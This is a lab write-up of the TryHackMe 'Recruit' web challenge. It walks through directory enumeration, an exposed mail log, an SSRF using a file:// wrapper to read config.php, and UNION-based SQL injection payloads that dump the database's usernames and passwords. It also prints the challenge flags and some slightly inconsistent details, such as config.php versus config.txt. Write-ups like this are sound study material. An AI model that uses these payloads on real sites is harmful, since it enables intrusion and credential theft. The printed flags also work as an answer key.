---
layout: writeup
title: TryHackMe - Recruit
date: 2026-10-05
platform: TryHackMe - OCT 2026
category: Web Exploitation
difficulty: Medium
description: Information/Directory exposure, Insecure Credential Storage, SSRF, SQLI 
---

# Overview

Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.
Can you gain an initial foothold, escalate your access, and ultimately log in as the administrator?
## Target
 - IP 10.48.161.170
 - User Credentials - username:password  
 - User Flag - THM{__________}  
 - Admin Credentials - username:password  
 - Admin Flag - THM{__________}


# Summary 
- Directory enumeration found webserver misconfiguration exposing `/sitemap.xml` and other sensitive directories. 
- Improper access controls allowed access to `/mail/mail.log` containing credentials used for deployment. This included HR’s `username: hr` and a note stating HR’s password is in config.txt. 
- Exposed API documentation at `/API.php` identified method for fetching CV’s `/file.php?cv=<URL>` which is vulnerable to SSRF. SSRF via `/file.php?cv=file://config.php` gave access to config.php revealing HR’s `password: hrpassword123`. 
- Login using HR `username:hr password:hrpassword123` gave access to the web portal revealing `USER FLAG THM{LOGGED_IN_USER}`. 
- User form to search for recruit applications found vulnerable to SQL Injection. Testing revealed SQL query must be similar to, 
`SELECT * FROM TABLE WHERE username LIKE ‘%input%`. Using SQL injection UNION attack database name `(recruit_db)`, table names `(candidates, users)` were identified. Users table contained columns `username, password`. Final SQL query revealed admin `username:admin and password:admin@001admin`
- Login to admin account revealed ADMIN FLAG: `THM{LOGGED_IN_ADM1N1}`

# Attack workflow 

## Enumeration
Upon observing the home page I was presented with a login form.

**NMAP**

```
nmap -sC -sV 10.48.161.170
```
Running Nmap resulted in three
Nmap resulted in 3 ports 
- 22/tcp OpenSSH 8.2p1
- 53/tcp ISC BIND
- 80/tcp Apache 2.4.41.


**GOBUSTER**
```
gobuster dir -u 10.48.161.170 -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt
```
Gobuster Revealed 5 interesting directories that are accessible 
- phpmyadmin    - Indicates mysql database
- sitemap.xml   - Reveals internal directories
- mail          - Possible exposed mail 
- API.php       - API functionality 

Investigating sitemap.xml revealed 

Investigating /mail revealed a mail directory with an internal log named mail.log
```
------------------------------------------------------------
Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials **(username: hr)** are currently stored in the application
  configuration file **(config.php)** for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.
------------------------------------------------------------
```

FOUND HR CREDENTIALS `username: hr` AND `password is stored within 'config.txt'`.  

Investigating /API revealed how to fetch candidate CV's via the API 
```
You can fetch a candidate CV using the following endpoint:  /file.php?cv=<URL>
```
## SSRF

Having the whole url as the parameter reveals a potential SSRF.  
First I tried `/file.php?cv=config.php.` error `only local files are allowed`.
This meant there is some form of handling preventing unknown files url's. Since the server was identified as Apache it was likely the LAMP stack was being used, indicating PHP. I initially tried some file traversal to no luck.  
After some research I learnt that “file://" is the default wrapper used with PHP and represents the local filesystem. When a relative path is specified (a path which does not begin with /, \, \\, or a Windows drive letter) the path provided will be applied against the current working directory.” which I found in the PHP documentation. 
So I tried `http://10.49.145.159//file.php?cv=file://config.php`
```
/*
|--------------------------------------------------------------------------
| Application Configuration
|--------------------------------------------------------------------------
*/

$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$APP_DEBUG       = false;

/*
|--------------------------------------------------------------------------
| HR Credentials (Temporary – Initial Rollout Phase)
|--------------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = 'hrpassword123';

/*
|--------------------------------------------------------------------------
| API Configuration
|--------------------------------------------------------------------------
*/
```
FOUND HR CREDENTIALS `username:hr password:hrpassword123`

After logging in the first flag is acquired

`FLAG: THM{LOGGED_IN_USER}`

## SQL INJECTION
After logging in I was presented with a form and a table listing candidate applications.


<div class="table-wrapper">
  <table class="data-table">
    <thead>
      <tr>
        <th>ID</th>
        <th>Name</th>
        <th>Position</th>
        <th>Status</th>
      </tr>
    </thead>

    <tbody>
      <tr>
        <td class="table-id">01</td>
        <td class="table-name">Alice Johnson</td>
        <td>Frontend Developer</td>
        <td><span class="status status-approved">Approved</span></td>
      </tr>

      <tr>
        <td class="table-id">02</td>
        <td class="table-name">Bob Smith</td>
        <td>Backend Developer</td>
        <td><span class="status status-review">Under Review</span></td>
      </tr>

      <tr>
        <td class="table-id">03</td>
        <td class="table-name">Charlie Brown</td>
        <td>Security Analyst</td>
        <td><span class="status status-rejected">Rejected</span></td>
      </tr>

      <tr>
        <td class="table-id">04</td>
        <td class="table-name">Diana Prince</td>
        <td>HR Executive</td>
        <td><span class="status status-selected">Selected</span></td>
      </tr>
    </tbody>
  </table>
</div>


I needed the admin credentials which were mentioned in mail.log as being stored in the database.
I attempted an SQL injection inputting `'` into the form and an error was rendered to the page.
```
SQL Error:
You have an error in your SQL syntax; check the manual that corresponds 
to your MySQL server version for the right syntax to use near '%'' at line 1 
```
Awesome an in-band SQL injection. The `‘` input broke out of the SQL statement and revealed `’%’` caused the error. Since `%` is a wildcard used in LIKE statements I figured it was performing something similar to `“SELECT * WHERE username LIKE ‘input’”`. Next I tried `alice%';-- `.  
Note: its important to have a space after the `--`.
<div class="table-wrapper">
  <table class="data-table">
    <thead>
      <tr>
        <th>ID</th>
        <th>Name</th>
        <th>Position</th>
        <th>Status</th>
      </tr>
    </thead>

    <tbody>
      <tr>
        <td class="table-id">01</td>
        <td class="table-name">Alice Johnson</td>
        <td>Frontend Developer</td>
        <td><span class="status status-approved">Approved</span></td>
      </tr>
    </tbody>
  </table>
</div>
Success, this meant it was a LIKE statement and the `;-- ` commented out the trailing `%’` causing the query to succeed.  
Now that I knew it was correct I began sending queries to learn about the database. 
I performed:
- Get no. columns == 4  `UNION SELECT `1234%' OR 0 UNION SELECT 1,2,3,4;-- `
- Get db name == recruit_db `1234' OR 0 UNION SELECT 1,2,3,database();-- `
- Get table names == candidates,users `1234%' OR 0 UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'recruit_db';-- `
- Get important column names of users == username,password`1234' OR 0 UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users';-- `
- Finally I Get username:password from users `1234' OR 0 UNION SELECT 1,2,3,group_concat(username,':',password SEPARATOR '<br>') FROM users;-- `

Revealing the admin `username:admin` password`admin@001admin`

Logging in reveals the final flag
1ADMIN FLAG: `THM{LOGGED_IN_ADM1N1}`
